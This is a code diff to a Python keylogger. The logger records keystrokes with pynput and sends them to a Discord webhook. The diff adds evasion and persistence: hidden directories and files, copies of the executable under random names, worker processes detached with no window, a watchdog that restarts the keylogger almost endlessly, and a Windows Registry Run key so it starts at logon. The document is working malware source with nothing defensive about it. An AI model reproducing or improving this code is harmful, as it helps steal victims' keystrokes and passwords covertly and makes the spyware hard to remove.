@@ -13,6 +13,9 @@ import threading
 import time
 import base64
 import random
+import subprocess
+import shutil
+from pathlib import Path
 from datetime import datetime, timezone
 from pynput import keyboard
 import requests
@@ -92,6 +95,136 @@ def generate_random_program_name():
     return base
 
 
+def get_hidden_directory():
+    """Get or create hidden directory for copies"""
+    if sys.platform == 'win32':
+        hidden_dir = Path(os.path.expandvars(r'%APPDATA%\SystemData'))
+    else:
+        hidden_dir = Path.home() / ".config" / ".system"
+
+    hidden_dir.mkdir(parents=True, exist_ok=True)
+
+    # Hide directory on Windows
+    if sys.platform == 'win32':
+        try:
+            os.system(f'attrib +h "{hidden_dir}"')
+        except:
+            pass
+
+    return hidden_dir
+
+
+def copy_with_random_name(source, target_dir):
+    """Copy executable with random name"""
+    random_name = generate_random_program_name()
+    extension = ".exe" if source.endswith(".exe") else ".py"
+    target = target_dir / f"{random_name}{extension}"
+
+    # Copy file
+    shutil.copy2(source, target)
+
+    # On Windows, hide the file
+    if sys.platform == 'win32':
+        try:
+            os.system(f'attrib +h "{target}"')
+        except:
+            pass
+
+    return target
+
+
+def start_worker_process(executable_path):
+    """Start worker process in background"""
+    try:
+        if sys.platform == 'win32':
+            # Start detached on Windows
+            process = subprocess.Popen(
+                [str(executable_path), "--worker"],
+                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+        else:
+            # Start detached on Linux
+            process = subprocess.Popen(
+                [str(executable_path), "--worker"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                preexec_fn=os.setpgrp
+            )
+        return process
+    except Exception as e:
+        return None
+
+
+def watchdog_mode():
+    """Watchdog mode - monitors and restarts worker"""
+    restart_count = 0
+    max_restarts = 999999  # Essentially infinite
+    restart_delay = 5
+
+    hidden_dir = get_hidden_directory()
+    current_exe = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
+
+    # Install persistence for watchdog itself on first run
+    if restart_count == 0:
+        try:
+            import winreg
+            program_name = generate_random_program_name()
+            watchdog_copy = copy_with_random_name(current_exe, hidden_dir)
+
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r'Software\Microsoft\Windows\CurrentVersion\Run',
+                0,
+                winreg.KEY_SET_VALUE
+            )
+            winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, str(watchdog_copy))
+            winreg.CloseKey(key)
+        except:
+            pass
+
+    while restart_count < max_restarts:
+        try:
+            # Copy executable with random name
+            worker_copy = copy_with_random_name(current_exe, hidden_dir)
+
+            # Start worker
+            process = start_worker_process(worker_copy)
+
+            if process is None:
+                time.sleep(restart_delay)
+                restart_count += 1
+                continue
+
+            # Monitor the process
+            while True:
+                exit_code = process.poll()
+
+                if exit_code is not None:
+                    # Process died, restart it
+                    restart_count += 1
+
+                    # Clean up old copy
+                    try:
+                        worker_copy.unlink()
+                    except:
+                        pass
+
+                    # Wait before restart
+                    time.sleep(restart_delay)
+                    break
+
+                # Check every second
+                time.sleep(1)
+
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            time.sleep(restart_delay)
+            restart_count += 1
+
+
 class AdvancedKeyLogger:
     """
     Advanced keylogger with modular features
@@ -142,8 +275,9 @@ class AdvancedKeyLogger:
             print("[!] Advanced modules not available")
             return
 
-        # Initialize persistence
-        if ENABLE_PERSISTENCE:
+        # Initialize persistence (skip if in worker mode - watchdog handles it)
+        is_worker_mode = len(sys.argv) > 1 and sys.argv[1] == "--worker"
+        if ENABLE_PERSISTENCE and not is_worker_mode:
             try:
                 # Use random name if enabled, otherwise use configured name
                 program_name = generate_random_program_name() if USE_RANDOM_NAMES else "SystemUpdate"
@@ -498,21 +632,25 @@ class AdvancedKeyLogger:
 
 def main():
     """Main entry point"""
-    # Validate webhook
-    if not WEBHOOK_URL or "discord.com/api/webhooks" not in WEBHOOK_URL:
-        print("[!] ERROR: Invalid webhook URL!")
-        print("[!] Please edit the WEBHOOK_URL in this script")
-        sys.exit(1)
+    # Check if running in worker mode or watchdog mode
+    if len(sys.argv) > 1 and sys.argv[1] == "--worker":
+        # Worker mode - do the actual keylogging
+        # Validate webhook
+        if not WEBHOOK_URL or "discord.com/api/webhooks" not in WEBHOOK_URL:
+            sys.exit(1)
 
-    # Create and start keylogger
-    logger = AdvancedKeyLogger(WEBHOOK_URL, SEND_INTERVAL)
+        # Create and start keylogger
+        logger = AdvancedKeyLogger(WEBHOOK_URL, SEND_INTERVAL)
 
-    try:
-        logger.start()
-    except KeyboardInterrupt:
-        logger.stop()
-    except Exception as e:
-        logger.stop()
+        try:
+            logger.start()
+        except KeyboardInterrupt:
+            logger.stop()
+        except Exception as e:
+            logger.stop()
+    else:
+        # Watchdog mode - monitor and restart worker
+        watchdog_mode()
 
 
 if __name__ == "__main__":
